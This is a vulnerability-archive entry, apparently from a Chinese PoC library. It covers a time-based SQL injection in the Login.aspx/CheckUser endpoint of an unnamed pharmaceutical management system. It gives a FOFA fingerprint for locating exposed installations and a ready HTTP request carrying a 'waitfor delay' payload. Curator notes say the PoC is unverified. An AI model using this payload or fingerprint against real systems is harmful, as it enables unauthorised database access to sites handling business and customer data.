---
source: "wy876 漏洞文库"
title: "医药业务管理系统（厂商未知） Login.aspx CheckUser value SQL注入"
product: "医药业务管理系统（厂商未知）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "SQL Server，产品版本未知"
prerequisites: "登录前接口声称"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/fq92t7qp61yzgzp1"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%8C%BB%E7%96%97%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F/%E5%8C%BB%E8%8D%AF%E5%85%AC%E5%8F%B8%E7%99%BB%E5%BD%95%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"ResourceScripts/zh-cn-Login.aspx.js\""
fofa_unverified: "body="
id: "vw-ff9b5f8b2766c4a7dde423c7"
entity_id: "ve-ff9b5f8b2766c4a7dde423c7"
schema_version: "1"
---

# 医药业务管理系统（厂商未知） Login.aspx CheckUser value SQL注入

## 条目说明

- 对象与具体问题：医药业务管理系统（厂商未知）；Login.aspx CheckUser value SQL注入
- 版本、配置及部署条件：SQL Server，产品版本未知
- 认证与权限前提：登录前接口声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 只有value延时JSON无响应/基线，不能证明SQL实际执行
- 缺官方版本/修复和根因，需明确名称与发行方

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
医药公司登录系统是一个全面且高效的管理工具，涵盖了销售管理、客户档案管理、药品字典管理等多个核心模块。该系统支持前台零售、批发销售、销售审核等多种销售方式，并具备完善的客户档案管理功能，包括客户的基本信息、经营权限等。此外，系统还提供国药标准药品字典库云下载功能，便于用户快速获取药品信息。整体而言，医药公司登录系统通过自动化的管理和数据分析，帮助医药企业优化业务流程，提升市场竞争力。

## 二、影响版本
+ 医药公司登录系统

## 三、资产测绘
+ fofa`body="ResourceScripts/zh-cn-Login.aspx.js"`


## 四、漏洞复现
```http
POST /Login.aspx/CheckUser HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
X-Requested-With: XMLHttpRequest
Content-Type: application/json; charset=utf-8
Priority: u=1

{"value":"' waitfor delay '0:0:5'--+"}
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fq92t7qp61yzgzp1>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
